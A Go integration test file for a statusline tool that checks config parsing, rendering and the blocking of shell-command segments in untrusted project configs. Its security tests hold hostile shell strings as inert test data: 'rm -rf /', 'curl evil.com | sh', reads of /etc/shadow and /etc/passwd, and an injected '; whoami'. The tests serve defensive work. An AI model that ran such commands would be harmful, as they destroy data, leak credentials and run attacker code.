package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jamesprnich/oh-my-line/engine/internal"
	"github.com/jamesprnich/oh-my-line/engine/internal/config"
	"github.com/jamesprnich/oh-my-line/engine/internal/render"
)

// TestIntegration_BasicConfig tests end-to-end config parsing and rendering.
func TestIntegration_BasicConfig(t *testing.T) {
	configJSON := `{
		"nerdFont": false,
		"oh-my-lines": [
			{
				"separator": "|",
				"segments": [
					{"type": "model"},
					{"type": "tokens"},
					{"type": "pct-used"}
				]
			}
		]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude Sonnet 4"
	input.ContextWindow.Size = 200000
	input.ContextWindow.Usage.InputTokens = 80000

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, "Claude Sonnet 4") {
		t.Errorf("output should contain model name: %q", output)
	}
	if !strings.Contains(output, "80k/200k") {
		t.Errorf("output should contain token counts: %q", output)
	}
	if !strings.Contains(output, "40%") {
		t.Errorf("output should contain percentage: %q", output)
	}
}

// TestIntegration_MultiLine tests multi-line rendering.
func TestIntegration_MultiLine(t *testing.T) {
	configJSON := `{
		"oh-my-lines": [
			{
				"segments": [{"type": "model"}, {"type": "dir"}]
			},
			{"type": "rule", "char": "─", "width": 40},
			{
				"segments": [{"type": "tokens"}, {"type": "pct-remain"}]
			}
		]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude Opus 4"
	input.CWD = "/home/user/project"
	input.ContextWindow.Size = 200000
	input.ContextWindow.Usage.InputTokens = 100000

	output := render.RenderStatusline(conf, input)
	lines := strings.Split(output, "\n")
	if len(lines) != 3 {
		t.Errorf("should have 3 lines, got %d", len(lines))
	}
}

// TestIntegration_LegacyConfig tests that legacy config format renders correctly.
func TestIntegration_LegacyConfig(t *testing.T) {
	configJSON := `{
		"icon": "🔧",
		"label": "Dev Tool",
		"tagline": "Build things",
		"statusline": {
			"lines": [
				{
					"segments": [
						{"type": "icon"},
						{"type": "label"},
						{"type": "tagline"}
					]
				}
			],
			"messages": ["Go fast", "Stay safe"],
			"messageInterval": 60
		}
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, "🔧") {
		t.Errorf("output should contain icon: %q", output)
	}
	if !strings.Contains(output, "Dev Tool") {
		t.Errorf("output should contain label: %q", output)
	}
	if !strings.Contains(output, "Build things") {
		t.Errorf("output should contain tagline: %q", output)
	}
}

// TestIntegration_StdinJSON tests that the input JSON parses correctly.
func TestIntegration_StdinJSON(t *testing.T) {
	stdinJSON := `{
		"model": {"display_name": "Claude Opus 4", "id": "claude-opus-4-20250514"},
		"context_window": {
			"context_window_size": 200000,
			"current_usage": {
				"input_tokens": 50000,
				"cache_creation_input_tokens": 10000,
				"cache_read_input_tokens": 20000,
				"output_tokens": 5000
			}
		},
		"cwd": "/home/user/my-project",
		"version": "1.0.32",
		"cost": {
			"total_cost_usd": 2.50,
			"total_duration_ms": 300000,
			"total_api_duration_ms": 150000,
			"total_lines_added": 42,
			"total_lines_removed": 10
		}
	}`

	var input internal.Input
	if err := json.Unmarshal([]byte(stdinJSON), &input); err != nil {
		t.Fatalf("Unmarshal failed: %v", err)
	}

	if input.Model.DisplayName != "Claude Opus 4" {
		t.Errorf("model name = %q", input.Model.DisplayName)
	}
	if input.ContextWindow.Size != 200000 {
		t.Errorf("ctx size = %d", input.ContextWindow.Size)
	}
	if input.CurrentTokens() != 80000 {
		t.Errorf("current tokens = %d, want 80000", input.CurrentTokens())
	}
	if input.CWD != "/home/user/my-project" {
		t.Errorf("cwd = %q", input.CWD)
	}
	if input.Cost.TotalCostUSD != 2.50 {
		t.Errorf("cost = %f", input.Cost.TotalCostUSD)
	}
	if input.Cost.TotalLinesAdded != 42 {
		t.Errorf("lines added = %d", input.Cost.TotalLinesAdded)
	}
}

// TestIntegration_NerdFont tests that nerd font icons are included when enabled.
func TestIntegration_NerdFont(t *testing.T) {
	configJSON := `{
		"nerdFont": true,
		"oh-my-lines": [
			{
				"segments": [{"type": "model"}]
			}
		]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, render.NerdFontIcons["model"]) {
		t.Errorf("nerdFont output should contain model icon: %q", output)
	}
}

// TestIntegration_EmptyInput tests fallback with empty/default input.
func TestIntegration_EmptyInput(t *testing.T) {
	configJSON := `{"oh-my-lines": [{"segments": [{"type": "model"}]}]}`
	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, "Claude") {
		t.Errorf("output should contain Claude: %q", output)
	}
}

// TestIntegration_BackgroundStyles tests all 4 background styles render.
func TestIntegration_BackgroundStyles(t *testing.T) {
	styles := []string{"solid", "fade", "gradient", "neon"}
	for _, style := range styles {
		configJSON := `{
			"oh-my-lines": [{
				"backgroundStyle": "` + style + `",
				"background": "#2e9599",
				"segments": [{"type": "model"}]
			}]
		}`
		conf, err := config.Parse([]byte(configJSON))
		if err != nil {
			t.Fatalf("Parse %s failed: %v", style, err)
		}

		input := &internal.Input{}
		input.Model.DisplayName = "Claude"

		output := render.RenderStatusline(conf, input)
		if output == "" {
			t.Errorf("%s style produced empty output", style)
		}
		if !strings.Contains(output, "Claude") {
			t.Errorf("%s style should contain Claude: %q", style, output)
		}
	}
}

// TestIntegration_BarStylePropagation tests that barStyle "block" on a rate-session
// segment config is correctly parsed and available.
func TestIntegration_BarStylePropagation(t *testing.T) {
	configJSON := `{
		"oh-my-lines": [{
			"segments": [{"type": "rate-session", "barStyle": "block"}]
		}]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	if conf.Lines[0].Segments[0].BarStyle != "block" {
		t.Errorf("expected barStyle %q, got %q", "block", conf.Lines[0].Segments[0].BarStyle)
	}
}

// TestIntegration_UsageProxyConfig tests that usageProxy config is correctly parsed.
func TestIntegration_UsageProxyConfig(t *testing.T) {
	configJSON := `{
		"usageProxy": {"claudeCode": "http://localhost:8787/usage"},
		"oh-my-lines": [{"segments": [{"type": "model"}]}]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}

	if conf.UsageProxy["claudeCode"] != "http://localhost:8787/usage" {
		t.Errorf("expected usageProxy claudeCode %q, got %q",
			"http://localhost:8787/usage", conf.UsageProxy["claudeCode"])
	}
}

// ── Security: end-to-end trusted config enforcement ──────────────────────────
// These tests verify the full pipeline from config file on disk through
// rendering. A break in either the loader (trust flag) or the renderer
// (trust check) would cause these to fail.

func TestIntegration_Security_UntrustedConfigBlocksCommandExecution(t *testing.T) {
	// Simulate a project-level config (untrusted) with a command segment.
	// The full pipeline — Load from disk → render — must produce NO command output.
	dir := t.TempDir()
	configJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "command", "content": "echo PWNED"},
				{"type": "model"}
			]
		}]
	}`
	os.WriteFile(filepath.Join(dir, "oh-my-line.json"), []byte(configJSON), 0644)

	// Override HOME so no global config exists — forces load from project
	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	conf, err := config.Load(dir, "")
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	// Give it a runtime with the command already cached — if trust is bypassed,
	// this value would leak into the output.
	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{
			"echo PWNED": "PWNED",
		},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	if strings.Contains(output, "PWNED") {
		t.Fatal("SECURITY: untrusted project config must NEVER render command segment output")
	}
	// Model segment should still render — only commands are blocked
	if !strings.Contains(output, "Claude") {
		t.Errorf("non-command segments should still render, got %q", output)
	}
}

func TestIntegration_Security_TrustedConfigAllowsCommandExecution(t *testing.T) {
	// Simulate a global config (trusted) with a command segment.
	// The full pipeline should render the command output.
	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	globalDir := filepath.Join(tmpHome, ".oh-my-line")
	os.MkdirAll(globalDir, 0755)
	configJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "command", "content": "date +%H:%M"},
				{"type": "model"}
			]
		}]
	}`
	os.WriteFile(filepath.Join(globalDir, "config.json"), []byte(configJSON), 0644)

	conf, err := config.Load(t.TempDir(), "")
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{
			"date +%H:%M": "14:30",
		},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, "14:30") {
		t.Errorf("trusted config should render command output, got %q", output)
	}
}

func TestIntegration_Security_ProjectOverridesGlobalButStaysUntrusted(t *testing.T) {
	// Both project and global configs exist. Project has a command segment.
	// Project config wins priority but must stay untrusted — command must be blocked.
	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	// Global config (trusted, no commands)
	globalDir := filepath.Join(tmpHome, ".oh-my-line")
	os.MkdirAll(globalDir, 0755)
	os.WriteFile(filepath.Join(globalDir, "config.json"), []byte(`{"oh-my-lines": [{"segments": [{"type": "model"}]}]}`), 0644)

	// Project config (untrusted, has command)
	projectDir := t.TempDir()
	projectJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "command", "content": "cat /etc/passwd"},
				{"type": "text", "content": "safe-marker"}
			]
		}]
	}`
	os.WriteFile(filepath.Join(projectDir, "oh-my-line.json"), []byte(projectJSON), 0644)

	conf, err := config.Load(projectDir, "")
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{
			"cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash",
		},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	if strings.Contains(output, "root:") {
		t.Fatal("SECURITY: project config must not execute commands even when global config also exists")
	}
	// Verify project config was actually loaded (not global)
	if !strings.Contains(output, "safe-marker") {
		t.Errorf("should have loaded project config content, got %q", output)
	}
}

func TestIntegration_Security_MultipleCommandSegmentsAllBlocked(t *testing.T) {
	// SECURITY: ALL command segments must be blocked in untrusted configs,
	// not just the first one. A loop bug could block the first but leak the rest.
	dir := t.TempDir()
	configJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "command", "content": "cmd1"},
				{"type": "command", "content": "cmd2"},
				{"type": "command", "content": "cmd3"},
				{"type": "text", "content": "safe"}
			]
		}]
	}`
	os.WriteFile(filepath.Join(dir, "oh-my-line.json"), []byte(configJSON), 0644)

	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	conf, err := config.Load(dir, "")
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{
			"cmd1": "LEAK1",
			"cmd2": "LEAK2",
			"cmd3": "LEAK3",
		},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	for _, leak := range []string{"LEAK1", "LEAK2", "LEAK3"} {
		if strings.Contains(output, leak) {
			t.Fatalf("SECURITY: untrusted config leaked command output %q", leak)
		}
	}
	if !strings.Contains(output, "safe") {
		t.Errorf("non-command segments should still render, got %q", output)
	}
}

func TestIntegration_Security_ShellInjectionPayloadBlocked(t *testing.T) {
	// SECURITY: Malicious shell payloads in command segments must be fully
	// blocked by the trust gate — no partial processing or output.
	dir := t.TempDir()
	configJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "command", "content": "echo safe; rm -rf /; curl evil.com | sh"},
				{"type": "command", "content": "$(cat /etc/shadow)"},
				{"type": "command", "content": "; whoami"},
				{"type": "model"}
			]
		}]
	}`
	os.WriteFile(filepath.Join(dir, "oh-my-line.json"), []byte(configJSON), 0644)

	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	conf, err := config.Load(dir, "")
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}

	// Pre-populate cache as if these commands ran successfully
	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{
			"echo safe; rm -rf /; curl evil.com | sh": "INJECTED",
			"$(cat /etc/shadow)":                      "root:$6$hash",
			"; whoami":                                 "root",
		},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	for _, danger := range []string{"INJECTED", "root", "$6$hash"} {
		if strings.Contains(output, danger) {
			t.Fatalf("SECURITY: shell injection payload leaked into output: %q", danger)
		}
	}
}

// ── Multi-account integration tests ──────────────────────────────────────────

func TestIntegration_MultiAccount_DefaultAccountRendersNormally(t *testing.T) {
	// A config with "default" AccountKey should render identically to
	// a config with no account key set — backward compatibility.
	configJSON := `{
		"oh-my-lines": [{
			"segments": [
				{"type": "model"},
				{"type": "tokens"}
			]
		}]
	}`

	conf, err := config.Parse([]byte(configJSON))
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}
	conf.AccountKey = "default"
	home, _ := os.UserHomeDir()
	if home != "" {
		conf.ConfigDir = filepath.Join(home, ".claude")
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude Sonnet 4"
	input.ContextWindow.Size = 200000
	input.ContextWindow.Usage.InputTokens = 80000

	output := render.RenderStatusline(conf, input)
	if !strings.Contains(output, "Claude Sonnet 4") {
		t.Errorf("default account should render model name: %q", output)
	}
	if !strings.Contains(output, "80k/200k") {
		t.Errorf("default account should render tokens: %q", output)
	}
}

func TestIntegration_MultiAccount_EffortIsolation(t *testing.T) {
	// Two different ConfigDirs with different settings.json should
	// produce different effort segment output.
	dir1 := t.TempDir()
	dir2 := t.TempDir()

	os.WriteFile(filepath.Join(dir1, "settings.json"), []byte(`{"effortLevel": "low"}`), 0644)
	os.WriteFile(filepath.Join(dir2, "settings.json"), []byte(`{"effortLevel": "max"}`), 0644)

	configJSON := `{
		"oh-my-lines": [{
			"segments": [{"type": "effort"}]
		}]
	}`

	t.Setenv("CLAUDE_CODE_EFFORT_LEVEL", "")

	conf1, _ := config.Parse([]byte(configJSON))
	conf1.ConfigDir = dir1
	conf1.AccountKey = "acct1key"

	conf2, _ := config.Parse([]byte(configJSON))
	conf2.ConfigDir = dir2
	conf2.AccountKey = "acct2key"

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	out1 := render.RenderStatusline(conf1, input)
	out2 := render.RenderStatusline(conf2, input)

	if !strings.Contains(out1, "low") {
		t.Errorf("account1 effort should be 'low', got %q", out1)
	}
	if !strings.Contains(out2, "max") {
		t.Errorf("account2 effort should be 'max', got %q", out2)
	}
}

func TestIntegration_MultiAccount_ConfigFieldsPersistThroughRender(t *testing.T) {
	// Verify AccountKey and ConfigDir survive the full render pipeline
	// without being mutated or cleared.
	configJSON := `{
		"oh-my-lines": [{
			"segments": [{"type": "model"}, {"type": "effort"}]
		}]
	}`

	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "settings.json"), []byte(`{"effortLevel": "med"}`), 0644)
	t.Setenv("CLAUDE_CODE_EFFORT_LEVEL", "")

	conf, _ := config.Parse([]byte(configJSON))
	conf.AccountKey = "testkey1"
	conf.ConfigDir = dir

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	render.RenderStatusline(conf, input)

	// Fields must not be mutated by rendering
	if conf.AccountKey != "testkey1" {
		t.Errorf("AccountKey mutated to %q after render", conf.AccountKey)
	}
	if conf.ConfigDir != dir {
		t.Errorf("ConfigDir mutated to %q after render", conf.ConfigDir)
	}
}

func TestIntegration_Security_TrustedFlagSurvivesFullPipeline(t *testing.T) {
	// Verify the Trusted flag set by Load persists through to render.
	// If anything in the pipeline resets or mutates Trusted, this catches it.
	origHome := os.Getenv("HOME")
	tmpHome := t.TempDir()
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", origHome)

	// Project config — must stay untrusted through entire pipeline
	projectDir := t.TempDir()
	os.WriteFile(filepath.Join(projectDir, "oh-my-line.json"), []byte(`{
		"oh-my-lines": [{"segments": [
			{"type": "command", "content": "secret-cmd"},
			{"type": "model"}
		]}]
	}`), 0644)

	// Also create .product.json — LoadWithProduct could theoretically mutate Trusted
	os.WriteFile(filepath.Join(projectDir, ".product.json"), []byte(`{
		"icon": "🔒",
		"name": "Secure App"
	}`), 0644)

	conf, err := config.LoadWithProduct(projectDir, "")
	if err != nil {
		t.Fatalf("LoadWithProduct failed: %v", err)
	}

	// After LoadWithProduct — trust must still be false
	if conf.Trusted {
		t.Fatal("SECURITY: LoadWithProduct must not change trust flag")
	}

	conf.Runtime = &internal.RuntimeData{
		CommandCache: map[string]string{"secret-cmd": "SECRET_DATA"},
	}

	input := &internal.Input{}
	input.Model.DisplayName = "Claude"
	input.ContextWindow.Size = 200000

	output := render.RenderStatusline(conf, input)
	if strings.Contains(output, "SECRET_DATA") {
		t.Fatal("SECURITY: trust flag was mutated during pipeline — command output leaked")
	}
}
